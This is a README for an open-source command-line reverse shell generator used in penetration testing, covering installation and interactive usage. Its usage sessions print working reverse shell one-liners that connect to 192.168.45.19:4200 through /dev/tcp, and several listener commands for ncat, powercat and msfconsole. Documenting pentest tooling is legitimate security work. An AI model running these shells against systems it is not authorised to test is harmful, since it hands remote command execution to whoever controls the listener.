# General Information

https://pypi.org/project/revshell-generator/

A command-line reverse shell generator, 
if you got tired of visiting https://www.revshells.com/ every time you need to pop up a reverse shell,
and you want to have such a generator in your terminal.


# Installation

```bash
apt install python3 python3-pip
git clone https://github.com/cyberhexe/reverse-shell-generator
cd reverse-shell-generator
pip3 install -r requirements.txt
python3 revshellgenerator.py -h
```

Or from PyPI:
```bash
sudo apt install python3 python3-pip
sudo pip3 install revshell-generator
revshell-generator -h
```

# Usage

### Running the reverse shell generator

```bash
$ python3 revshellgenerator.py
Welcome to the reverse shell generator script. Type 'help' or '?' to list available commands.
>> help
Documented commands (type help <topic>):
========================================g
get  help  ip  list  port  shell
>> help list
list [ reverse | listeners | shells | msfvenom ]
List the available templates, shells or listener commands.
E.g.: list shells
>> help get
get [ reverse | listeners | msfvenom ] [index]
Generate the actual command with the given options.
The first parameter specifies which type of the command it's going to be.
The [index] parameter specifies which template should be used for generating the command.
E.g.: get reverse 0
Use 'list' command for getting the index.
>>
```

### Setting reverse IP address and port

```bash
$ python3 revshellgenerator.py
Welcome to the reverse shell generator script. Type 'help' or '?' to list available commands.
>> ip 192.168.45.19
The IP address has been set as '192.168.45.19'
>> port 4200
The port has been set as '4200'
>>  
```

Alternatively, you can provide the IP/port as script arguments for not prompting them later:
`python3 revshellgenerator.py --ip 192.168.45.19 --port 4200`

### Listing available reverse shell commands
```bash
$ python3 revshellgenerator.py
Welcome to the reverse shell generator script. Type 'help' or '?' to list available commands.
>> list reverse
0 - Bash -i [linux | mac]
1 - Bash 196 [linux | mac]
2 - Bash read line [linux | mac]
3 - Bash 5 [linux | mac]4 - Bash udp [linux | mac]
5 - nc mkfifo [linux | mac]6 - nc -e [linux | mac]
7 - nc.exe -e [windows]8 - nc -c [linux | mac]
9 - ncat -e [linux | mac]10 - ncat.exe -e [windows]
... truncated ...
>> 
```

*The indexes are used while choosing the command template.*

### Listing available listener commands
```bash
$ python3 revshellgenerator.py
Welcome to the reverse shell generator script. Type 'help' or '?' to list available commands.
>> list listeners
0 - nc
1 - ncat
2 - ncat (TLS)
3 - rlwrap + nc4 - rustcat
5 - rustcat + Command History6 - pwncat
7 - windows ConPty8 - socat
9 - socat (TTY)
10 - powercat
11 - msfconsole
>>
```

### Generating reverse shell commands

```bash
$ python3 revshellgenerator.py
Welcome to the reverse shell generator script. Type 'help' or '?' to list available commands.
>> ip 192.168.45.19
The IP address has been set as '192.168.45.19'
>> port 4200
The port has been set as '4200'
>> get reverse 0
/bin/sh -i >& /dev/tcp/192.168.45.19/4200 0>&1
>> get reverse 1
0<&196;exec 196<>/dev/tcp/192.168.45.19/4200; /bin/sh <&196 >&196 2>&196
>> get reverse 2
exec 5<>/dev/tcp/192.168.45.19/4200;cat <&5 | while read line; do $line 2>&5 >&5; done
>>  
```

Alternatively, you can provide the IP/port as script arguments and call the `get reverse` command straightaway
```bash
$ python3 revshellgenerator.py --ip 192.168.45.19 --port 4200
Welcome to the reverse shell generator script. Type 'help' or '?' to list available commands.
>> get reverse 0
/bin/sh -i >& /dev/tcp/192.168.45.19/4200 0>&1
>> get reverse 1
0<&196;exec 196<>/dev/tcp/192.168.45.19/4200; /bin/sh <&196 >&196 2>&196
>> get reverse 2
exec 5<>/dev/tcp/192.168.45.19/4200;cat <&5 | while read line; do $line 2>&5 >&5; done
>>  
```

### Generating listeners commands
```bash
$ python3 revshellgenerator.py --ip 192.168.45.19 --port 5050
Welcome to the reverse shell generator script. Type 'help' or '?' to list available commands.
>> get listeners 10
powercat -l -p 5050
>> get listeners 1
ncat -lvnp 5050
>> get listeners 11
msfconsole -q -x "use multi/handler; set payload {payload}; set lhost 192.168.45.19; set lport 5050; exploit"  
```
